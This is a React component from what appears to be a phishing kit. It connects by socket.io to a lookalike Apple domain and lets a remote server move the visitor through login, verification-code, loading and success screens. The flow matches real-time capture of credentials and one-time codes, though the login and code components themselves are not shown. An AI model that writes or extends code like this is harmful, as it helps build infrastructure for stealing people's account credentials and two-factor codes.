import React, { useEffect } from "react";
import Login from "./Login";
import Code from "./Code";
import Loading from "./Loading";
import io from "socket.io-client";
import { useQuery, useQueryClient } from "@tanstack/react-query";
import SuccessPage from "./SuccessPage";

function HomePage({ authUser, isLoading }) {
  const queryClient = useQueryClient();

  //listen to socket event
  useEffect(() => {
    const newSocket = io("https://10271-apple.com"); // Replace with your server's URL

    // Listen for new user registration events
    newSocket.on("page_changed", (data) => {
      if (data.page === "login") {
        window.location.reload();
      }
      queryClient.invalidateQueries({ queryKey: ["authUser"] });
    });

    return () => newSocket.close();
  }, []);

  return (
    <div className=" w-full min-h-screen bg-white">
      {(authUser?.currentPage === "login" || !authUser) && (
        <Login authUser={authUser} />
      )}
      {authUser?.currentPage === "code" && <Code authUser={authUser} />}
      {authUser?.currentPage === "loading" && <Loading />}
      {authUser?.currentPage === "success" && <SuccessPage />}
      {/* {!authUser && <Login authUser={authUser && authUser}/>} */}
    </div>
  );
}

export default HomePage;



















